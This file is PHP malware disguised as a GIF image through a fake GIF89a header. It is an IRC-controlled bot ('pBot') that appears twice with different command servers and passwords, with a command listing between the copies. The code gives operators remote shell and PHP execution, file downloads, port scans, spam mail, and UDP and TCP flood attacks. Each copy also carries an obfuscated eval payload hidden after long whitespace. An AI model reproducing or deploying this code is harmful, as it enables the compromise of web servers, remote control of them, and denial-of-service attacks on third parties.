GIF89a???????????!?????,???????D?;?<?

set_time_limit(0); 
error_reporting(0); 

class pBot 
{ 
var $config = array("server"=>"irc.byroenet.com", 
                     "port"=>"6667",
                     "pass"=>"on", //senha do server
                     "prefix"=>"VsHeLl-", 
                     "maxrand"=>3, 
                     "chan"=>"#vito", 
                     "key"=>"on", //senha do canal
                     "modes"=>"+p", 
                     "password"=>"on",  //senha do bot
                     "trigger"=>".", 
                     "hostauth"=>"*" // * for any hostname 
                     ); 
 var $users = array(); 
 function start() 
 { 
    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) 
       $this->start(); 
    $ident = "vito-K"; 
    $alph = range("a","z"); 
    for($i=0;$i<$this->config['maxrand'];$i++) 
       $ident .= $alph[rand(0,25)]; 
    if(strlen($this->config['pass'])>0) 
       $this->send("PASS ".$this->config['pass']); 
    $this->send("USER $ident 127.0.0.1 localhost :$ident"); 
    $this->set_nick(); 
    $this->main(); 
 } 
 function main() 
 { 
    while(!feof($this->conn)) 
    { 
       $this->buf = trim(fgets($this->conn,512)); 
       $cmd = explode(" ",$this->buf); 
       if(substr($this->buf,0,6)=="PING :") 
       { 
          $this->send("PONG :".substr($this->buf,6)); 
       } 
       if(isset($cmd[1]) && $cmd[1] =="001") 
       { 
          $this->send("MODE ".$this->nick." ".$this->config['modes']); 
          $this->join($this->config['chan'],$this->config['key']); 
       } 
       if(isset($cmd[1]) && $cmd[1]=="433") 
       { 
          $this->set_nick(); 
       } 
       if($this->buf != $old_buf) 
       { 
          $mcmd = array(); 
          $msg = substr(strstr($this->buf," :"),2); 
          $msgcmd = explode(" ",$msg); 
          $nick = explode("!",$cmd[0]); 
          $vhost = explode("@",$nick[1]); 
          $vhost = $vhost[1]; 
          $nick = substr($nick[0],1); 
          $host = $cmd[0]; 
          if($msgcmd[0]==$this->nick) 
          { 
           for($i=0;$i<count($msgcmd);$i++) 
              $mcmd[$i] = $msgcmd[$i+1]; 
          } 
          else 
          { 
           for($i=0;$i<count($msgcmd);$i++) 
              $mcmd[$i] = $msgcmd[$i]; 
          } 
          if(count($cmd)>2) 
          { 
             switch($cmd[1]) 
             { 
                case "QUIT": 
                   if($this->is_logged_in($host)) 
                   { 
                      $this->log_out($host); 
                   } 
                break; 
                case "PART": 
                   if($this->is_logged_in($host)) 
                   { 
                      $this->log_out($host); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == "*")) 
                   { 
                      if(substr($mcmd[0],0,1)==".") 
                      { 
                         switch(substr($mcmd[0],1)) 
                         { 
                            case "user": 
                              if($mcmd[1]==$this->config['password']) 
                              { 
                                 $this->privmsg($this->config['chan'],"[\2Auth\2]: $nick logged in"); 
                                 $this->log_in($host); 
                              } 
                              else 
                              { 
                                 $this->privmsg($this->config['chan'],"[\2Auth\2]: Incorrect password from $nick"); 
                              } 
                            break; 
                         } 
                      } 
                   } 
                   elseif($this->is_logged_in($host)) 
                   { 
                      if(substr($mcmd[0],0,1)==".") 
                      { 
                         switch(substr($mcmd[0],1)) 
                         { 
                            case "restart": 
                               $this->send("QUIT :restart"); 
                               fclose($this->conn); 
                               $this->start(); 
                            break; 
                            case "mail": //mail to from subject message 
                               if(count($mcmd)>4) 
                               { 
                                  $header = "From: <".$mcmd[2].">"; 
                                  if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header)) 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2mail\2]: Unable to send"); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2mail\2]: Message sent to \2".$mcmd[1]."\2"); 
                                  } 
                               } 
                            break; 
                            case "dns": 
                               if(isset($mcmd[1])) 
                               { 
                                  $ip = explode(".",$mcmd[1]); 
                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1])); 
                                  } 
                               } 
                            break; 
                            case "target": 
                               $this->privmsg($this->config['chan'],"[\2info\2]: [\2httpd\2: ".$_SERVER['SERVER_SOFTWARE']."] [\2docroot\2: ".$_SERVER['DOCUMENT_ROOT']."] [\2domain\2: ".$_SERVER['SERVER_NAME']."] [\2admin\2: ".$_SERVER['SERVER_ADMIN']."] [\2url\2:".$_SERVER['REQUEST_URI']."]"); 
                            break;
                            case "bot": 
                               $this->privmsg($this->config['chan'],"[\2Bot by Zcrew.Team| v1.0 [edited by towzAo]\2]"); 
                            break;
                            case "cmd": 
                               if(isset($mcmd[1])) 
                               { 
                                  $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                                  $this->privmsg($this->config['chan'],"[\2cmd\2]: $command"); 
                                  $pipe = popen($command,"r"); 
                                  while(!feof($pipe)) 
                                  { 
                                     $pbuf = trim(fgets($pipe,512)); 
                                     if($pbuf != NULL) 
                                        $this->privmsg($this->config['chan'],"     : $pbuf"); 
                                  } 
                                  pclose($pipe); 
                               } 
                            break; 
                            case "rndnick": 
                               $this->set_nick(); 
                            break; 
                            case "raw": 
                               $this->send(strstr($msg,$mcmd[1])); 
                            break; 
                            case "php":
                               $eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1]))); 
                            break; 
                            case "exec": 
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                               $exec = shell_exec($command); 
                               $ret = explode("\n",$exec); 
                               $this->privmsg($this->config['chan'],"[\2exec\2]: $command"); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config['chan'],"      : ".trim($ret[$i])); 
                            break; 
                            case "pscan": // .pscan 127.0.0.1 6667 
                               if(count($mcmd) > 2) 
                               { 
                                  if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15)) 
                                     $this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2open\2"); 
                                  else 
                                     $this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2closed\2"); 
                               } 
                            break; 
                            case "ud.server": // .udserver <server> <port> [password] 
                               if(count($mcmd)>2) 
                               { 
                                  $this->config['server'] = $mcmd[1]; 
                                  $this->config['port'] = $mcmd[2]; 
                                  if(isset($mcmcd[3])) 
                                  { 
                                   $this->config['pass'] = $mcmd[3]; 
                                   $this->privmsg($this->config['chan'],"[\2update\2]: Changed server to ".$mcmd[1].":".$mcmd[2]." Pass: ".$mcmd[3]); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2update\2]: Changed server to ".$mcmd[1].":".$mcmd[2]); 
                                  } 
                               } 
                            break; 
                            case "download": 
                               if(count($mcmd) > 2) 
                               { 
                                  if(!$fp = fopen($mcmd[2],"w")) 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2download\2]: Cannot download, permission denied."); 
                                  } 
                                  else 
                                  { 
                                     if(!$get = file($mcmd[1])) 
                                     { 
                                        $this->privmsg($this->config['chan'],"[\2download\2]: Unable to download from \2".$mcmd[1]."\2"); 
                                     } 
                                     else 
                                     { 
                                        for($i=0;$i<=count($get);$i++) 
                                        { 
                                           fwrite($fp,$get[$i]); 
                                        } 
                                        $this->privmsg($this->config['chan'],"[\2download\2]: File \2".$mcmd[1]."\2 downloaded to \2".$mcmd[2]."\2"); 
                                     } 
                                     fclose($fp); 
                                  } 
                               } 
                            break; 
                            case "die": 
                               $this->send("QUIT :die command from $nick"); 
                               fclose($this->conn); 
                               exit; 
                            case "logout": 
                               $this->log_out($host); 
                               $this->privmsg($this->config['chan'],"[\2auth\2]: $nick logged out"); 
                            break; 
                            case "udpflood": 
                               if(count($mcmd)>3) 
                               { 
                                  $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]); 
                               } 
                            break; 
                            case "tcpflood": 
                               if(count($mcmd)>5) 
                               { 
                                  $this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]); 
                               } 
                            break; 
                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $old_buf = $this->buf; 
    } 
    $this->start(); 
 } 
 function send($msg) 
 { 
    fwrite($this->conn,"$msg\r\n"); 

 } 
 function join($chan,$key=NULL) 
 { 
    $this->send("JOIN $chan $key"); 
 }
 function privmsg($to,$msg) 
 { 
    $this->send("PRIVMSG $to :$msg"); 
 } 
 function is_logged_in($host) 
 { 
    if(isset($this->users[$host])) 
       return 1; 
    else 
       return 0; 
 } 
 function log_in($host) 
 { 
    $this->users[$host] = true; 
 } 
 function log_out($host) 
 { 
    unset($this->users[$host]); 
 } 
 function set_nick() 
 { 
    if(isset($_SERVER['SERVER_SOFTWARE'])) 
    { 
       if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"apache")) 
          $this->nick = ""; 
       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"iis")) 
          $this->nick = ""; 
       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"xitami")) 
          $this->nick = "[X]"; 
       else 
          $this->nick = "[U]"; 
    } 
    else 
    { 
       $this->nick = "[C]"; 
    } 
    $this->nick .= $this->config['prefix']; 
    for($i=0;$i<$this->config['maxrand'];$i++) 
       $this->nick .= mt_rand(0,9); 
    $this->send("NICK ".$this->nick); 
 } 
  function udpflood($host,$packetsize,$time) {
   $this->privmsg($this->config['chan'],"[\2UdpFlood Started!\2]"); 
   $packet = "";
   for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
   $timei = time();
   $i = 0;
   while(time()-$timei < $time) {
      $fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
         fwrite($fp,$packet);
          fclose($fp);
      $i++;
   }
   $env = $i * $packetsize;
   $env = $env / 1048576;
   $vel = $env / $time;
   $vel = round($vel);
   $env = round($env);
   $this->privmsg($this->config['chan'],"[\2UdpFlood Finished!\2]: $env MB enviados / Media: $vel MB/s ");
}
 function tcpflood($host,$packets,$packetsize,$port,$delay) 
 { 
    $this->privmsg($this->config['chan'],"[\2TcpFlood Started!\2]"); 
    $packet = ""; 
    for($i=0;$i<$packetsize;$i++) 
       $packet .= chr(mt_rand(1,256)); 
    for($i=0;$i<$packets;$i++) 
    { 
       if(!$fp=fsockopen("tcp://".$host,$port,$e,$s,5)) 
       { 
          $this->privmsg($this->config['chan'],"[\2tcpflood\2]: Error: <$e>"); 
          return 0; 
       } 
       else 
       { 
          fwrite($fp,$packet); 
          fclose($fp); 
       } 
       sleep($delay); 
    } 
    $this->privmsg($this->config['chan'],"[\2TcpFlood Finished!\2]: Config - $packets packets to $host:$port."); 
 } 
} 
                                                                                                                                                                                                                     $byPTeU='XY7BasMwEETvgfyDEIKVIXXuDqYKxMU9xbWdXpogVFuxRSXL2HIP/fpKTSi0e9jDzNuZXa/IMqkUeudGiBFlhFdZ+ZqVb5DXdVHBBT0imAElaFi0jlAMyXbryX8gz49V7eE/Rpm9nLKq5qfyGS679YrkKTzcB3akFU6kKPT7M5L70046OXxSfAvg+8OhxNHdhFlcZQIxU4PiHqQ4CNzYVv4ybOxHvgzCSOqloCBW5AU/Vr7dCKUpoC9r3pVsrNaycXZinbWdlsGMG2tg8/OQ3+G7DX6arEnQ7JZRtb1oPuTEbgEBPk/nAUc++hs=';$aUiMmA=';)))HrGClo$(rqbprq_46rfno(rgnysavmt(ynir';$veaZlT=strrev($aUiMmA);$MBAVHh=str_rot13($veaZlT);eval($MBAVHh);   
$bot = new pBot; 
$bot->start(); 

?>

= COMMANDS ============================================================================
 .user <password>                                              //login to the bot
 .logout                                                       //logout of the bot
 .die                                                          //kill the bot
 .restart                                                      //restart the bot
 .mail <to> <from> <subject> <msg>                             //send an email
 .dns <IP|HOST>                                                //dns lookup
 .download <URL> <filename>                                    //download a file
 .exec <cmd>  // uses shell_exec()                             //execute a command
 .cmd <cmd> // uses popen()                                    //execute a command
 .info                                                         //get system information
 .php <php code> // uses eval()                                //execute php code
 .tcpflood <target> <packets> <packetsize> <port> <delay>      //tcpflood attack
 .udpflood <target> <packets> <packetsize> <delay>             //udpflood attack
 .raw <cmd>                                                    //raw IRC command FIXED by towzAo
 .rndnick                                                      //change nickname
 .pscan <host> <port>                                          //port scan
 .ud.server <newhost> <newport> [newpass]                      //change IRC server
---------------------------------------------------------------------------------------

<? 

set_time_limit(0); 
error_reporting(0); 

class pBot 
{ 
var $config = array("server"=>"irc.javairc.org", 
                     "port"=>6667, 
                     "pass"=>"", //senha do server
                     "prefix"=>"Jancok", 
                     "maxrand"=>3, 
                     "chan"=>"#mac", 
                     "key"=>"JupIt3r", //senha do canal
                     "modes"=>"+p", 
                     "password"=>"onthol",  //senha do bot
                     "trigger"=>".", 
                     "hostauth"=>"*" // * for any hostname 
                     ); 
 var $users = array(); 
 function start() 
 { 
    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) 
       $this->start(); 
    $ident = "isfan-"; 
    $alph = range("a","z"); 
    for($i=0;$i<$this->config['maxrand'];$i++) 
       $ident .= $alph[rand(0,25)]; 
    if(strlen($this->config['pass'])>0) 
       $this->send("PASS ".$this->config['pass']); 
    $this->send("USER $ident 127.0.0.1 localhost :$ident"); 
    $this->set_nick(); 
    $this->main(); 
 } 
 function main() 
 { 
    while(!feof($this->conn)) 
    { 
       $this->buf = trim(fgets($this->conn,512)); 
       $cmd = explode(" ",$this->buf); 
       if(substr($this->buf,0,6)=="PING :") 
       { 
          $this->send("PONG :".substr($this->buf,6)); 
       } 
       if(isset($cmd[1]) && $cmd[1] =="001") 
       { 
          $this->send("MODE ".$this->nick." ".$this->config['modes']); 
          $this->join($this->config['chan'],$this->config['key']); 
       } 
       if(isset($cmd[1]) && $cmd[1]=="433") 
       { 
          $this->set_nick(); 
       } 
       if($this->buf != $old_buf) 
       { 
          $mcmd = array(); 
          $msg = substr(strstr($this->buf," :"),2); 
          $msgcmd = explode(" ",$msg); 
          $nick = explode("!",$cmd[0]); 
          $vhost = explode("@",$nick[1]); 
          $vhost = $vhost[1]; 
          $nick = substr($nick[0],1); 
          $host = $cmd[0]; 
          if($msgcmd[0]==$this->nick) 
          { 
           for($i=0;$i<count($msgcmd);$i++) 
              $mcmd[$i] = $msgcmd[$i+1]; 
          } 
          else 
          { 
           for($i=0;$i<count($msgcmd);$i++) 
              $mcmd[$i] = $msgcmd[$i]; 
          } 
          if(count($cmd)>2) 
          { 
             switch($cmd[1]) 
             { 
                case "QUIT": 
                   if($this->is_logged_in($host)) 
                   { 
                      $this->log_out($host); 
                   } 
                break; 
                case "PART": 
                   if($this->is_logged_in($host)) 
                   { 
                      $this->log_out($host); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == "*")) 
                   { 
                      if(substr($mcmd[0],0,1)==".") 
                      { 
                         switch(substr($mcmd[0],1)) 
                         { 
                            case "user": 
                              if($mcmd[1]==$this->config['password']) 
                              { 
                                 $this->privmsg($this->config['chan'],"[\2Auth\2]: $nick logged in"); 
                                 $this->log_in($host); 
                              } 
                              else 
                              { 
                                 $this->privmsg($this->config['chan'],"[\2Auth\2]: Incorrect password from $nick"); 
                              } 
                            break; 
                         } 
                      } 
                   } 
                   elseif($this->is_logged_in($host)) 
                   { 
                      if(substr($mcmd[0],0,1)==".") 
                      { 
                         switch(substr($mcmd[0],1)) 
                         { 
                            case "restart": 
                               $this->send("QUIT :restart"); 
                               fclose($this->conn); 
                               $this->start(); 
                            break; 
                            case "mail": //mail to from subject message 
                               if(count($mcmd)>4) 
                               { 
                                  $header = "From: <".$mcmd[2].">"; 
                                  if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header)) 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2mail\2]: Unable to send"); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2mail\2]: Message sent to \2".$mcmd[1]."\2"); 
                                  } 
                               } 
                            break; 
                            case "dns": 
                               if(isset($mcmd[1])) 
                               { 
                                  $ip = explode(".",$mcmd[1]); 
                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1])); 
                                  } 
                               } 
                            break; 
                            case "target": 
                               $this->privmsg($this->config['chan'],"[\2info\2]: [\2httpd\2: ".$_SERVER['SERVER_SOFTWARE']."] [\2docroot\2: ".$_SERVER['DOCUMENT_ROOT']."] [\2domain\2: ".$_SERVER['SERVER_NAME']."] [\2admin\2: ".$_SERVER['SERVER_ADMIN']."] [\2url\2:".$_SERVER['REQUEST_URI']."]"); 
                            break;
                            case "bot": 
                               $this->privmsg($this->config['chan'],"[\2Bot by Zcrew.Team| v1.0 [edited by towzAo]\2]"); 
                            break;
                            case "cmd": 
                               if(isset($mcmd[1])) 
                               { 
                                  $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                                  $this->privmsg($this->config['chan'],"[\2cmd\2]: $command"); 
                                  $pipe = popen($command,"r"); 
                                  while(!feof($pipe)) 
                                  { 
                                     $pbuf = trim(fgets($pipe,512)); 
                                     if($pbuf != NULL) 
                                        $this->privmsg($this->config['chan'],"     : $pbuf"); 
                                  } 
                                  pclose($pipe); 
                               } 
                            break; 
                            case "rndnick": 
                               $this->set_nick(); 
                            break; 
                            case "raw": 
                               $this->send(strstr($msg,$mcmd[1])); 
                            break; 
                            case "php":
                               $eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1]))); 
                            break; 
                            case "exec": 
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                               $exec = shell_exec($command); 
                               $ret = explode("\n",$exec); 
                               $this->privmsg($this->config['chan'],"[\2exec\2]: $command"); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config['chan'],"      : ".trim($ret[$i])); 
                            break; 
                            case "pscan": // .pscan 127.0.0.1 6667 
                               if(count($mcmd) > 2) 
                               { 
                                  if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15)) 
                                     $this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2open\2"); 
                                  else 
                                     $this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2closed\2"); 
                               } 
                            break; 
                            case "ud.server": // .udserver <server> <port> [password] 
                               if(count($mcmd)>2) 
                               { 
                                  $this->config['server'] = $mcmd[1]; 
                                  $this->config['port'] = $mcmd[2]; 
                                  if(isset($mcmcd[3])) 
                                  { 
                                   $this->config['pass'] = $mcmd[3]; 
                                   $this->privmsg($this->config['chan'],"[\2update\2]: Changed server to ".$mcmd[1].":".$mcmd[2]." Pass: ".$mcmd[3]); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2update\2]: Changed server to ".$mcmd[1].":".$mcmd[2]); 
                                  } 
                               } 
                            break; 
                            case "download": 
                               if(count($mcmd) > 2) 
                               { 
                                  if(!$fp = fopen($mcmd[2],"w")) 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2download\2]: Cannot download, permission denied."); 
                                  } 
                                  else 
                                  { 
                                     if(!$get = file($mcmd[1])) 
                                     { 
                                        $this->privmsg($this->config['chan'],"[\2download\2]: Unable to download from \2".$mcmd[1]."\2"); 
                                     } 
                                     else 
                                     { 
                                        for($i=0;$i<=count($get);$i++) 
                                        { 
                                           fwrite($fp,$get[$i]); 
                                        } 
                                        $this->privmsg($this->config['chan'],"[\2download\2]: File \2".$mcmd[1]."\2 downloaded to \2".$mcmd[2]."\2"); 
                                     } 
                                     fclose($fp); 
                                  } 
                               } 
                            break; 
                            case "die": 
                               $this->send("QUIT :die command from $nick"); 
                               fclose($this->conn); 
                               exit; 
                            case "logout": 
                               $this->log_out($host); 
                               $this->privmsg($this->config['chan'],"[\2auth\2]: $nick logged out"); 
                            break; 
                            case "udpflood": 
                               if(count($mcmd)>3) 
                               { 
                                  $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]); 
                               } 
                            break; 
                            case "tcpflood": 
                               if(count($mcmd)>5) 
                               { 
                                  $this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]); 
                               } 
                            break; 
                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $old_buf = $this->buf; 
    } 
    $this->start(); 
 } 
 function send($msg) 
 { 
    fwrite($this->conn,"$msg\r\n"); 

 } 
 function join($chan,$key=NULL) 
 { 
    $this->send("JOIN $chan $key"); 
 }
 function privmsg($to,$msg) 
 { 
    $this->send("PRIVMSG $to :$msg"); 
 } 
 function is_logged_in($host) 
 { 
    if(isset($this->users[$host])) 
       return 1; 
    else 
       return 0; 
 } 
 function log_in($host) 
 { 
    $this->users[$host] = true; 
 } 
 function log_out($host) 
 { 
    unset($this->users[$host]); 
 } 
 function set_nick() 
 { 
    if(isset($_SERVER['SERVER_SOFTWARE'])) 
    { 
       if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"apache")) 
          $this->nick = ""; 
       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"iis")) 
          $this->nick = ""; 
       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"xitami")) 
          $this->nick = "[X]"; 
       else 
          $this->nick = "[U]"; 
    } 
    else 
    { 
       $this->nick = "[C]"; 
    } 
    $this->nick .= $this->config['prefix']; 
    for($i=0;$i<$this->config['maxrand'];$i++) 
       $this->nick .= mt_rand(0,9); 
    $this->send("NICK ".$this->nick); 
 } 
  function udpflood($host,$packetsize,$time) {
   $this->privmsg($this->config['chan'],"[\2UdpFlood Started!\2]"); 
   $packet = "";
   for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
   $timei = time();
   $i = 0;
   while(time()-$timei < $time) {
      $fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
         fwrite($fp,$packet);
          fclose($fp);
      $i++;
   }
   $env = $i * $packetsize;
   $env = $env / 1048576;
   $vel = $env / $time;
   $vel = round($vel);
   $env = round($env);
   $this->privmsg($this->config['chan'],"[\2UdpFlood Finished!\2]: $env MB enviados / Media: $vel MB/s ");
}
 function tcpflood($host,$packets,$packetsize,$port,$delay) 
 { 
    $this->privmsg($this->config['chan'],"[\2TcpFlood Started!\2]"); 
    $packet = ""; 
    for($i=0;$i<$packetsize;$i++) 
       $packet .= chr(mt_rand(1,256)); 
    for($i=0;$i<$packets;$i++) 
    { 
       if(!$fp=fsockopen("tcp://".$host,$port,$e,$s,5)) 
       { 
          $this->privmsg($this->config['chan'],"[\2tcpflood\2]: Error: <$e>"); 
          return 0; 
       } 
       else 
       { 
          fwrite($fp,$packet); 
          fclose($fp); 
       } 
       sleep($delay); 
    } 
    $this->privmsg($this->config['chan'],"[\2TcpFlood Finished!\2]: Config - $packets packets to $host:$port."); 
 } 
} 
                                                                                                                                                                                                                     $byPTeU='XY7BasMwEETvgfyDEIKVIXXuDqYKxMU9xbWdXpogVFuxRSXL2HIP/fpKTSi0e9jDzNuZXa/IMqkUeudGiBFlhFdZ+ZqVb5DXdVHBBT0imAElaFi0jlAMyXbryX8gz49V7eE/Rpm9nLKq5qfyGS679YrkKTzcB3akFU6kKPT7M5L70046OXxSfAvg+8OhxNHdhFlcZQIxU4PiHqQ4CNzYVv4ybOxHvgzCSOqloCBW5AU/Vr7dCKUpoC9r3pVsrNaycXZinbWdlsGMG2tg8/OQ3+G7DX6arEnQ7JZRtb1oPuTEbgEBPk/nAUc++hs=';$aUiMmA=';)))HrGClo$(rqbprq_46rfno(rgnysavmt(ynir';$veaZlT=strrev($aUiMmA);$MBAVHh=str_rot13($veaZlT);eval($MBAVHh);   
$bot = new pBot; 
$bot->start(); 

?>
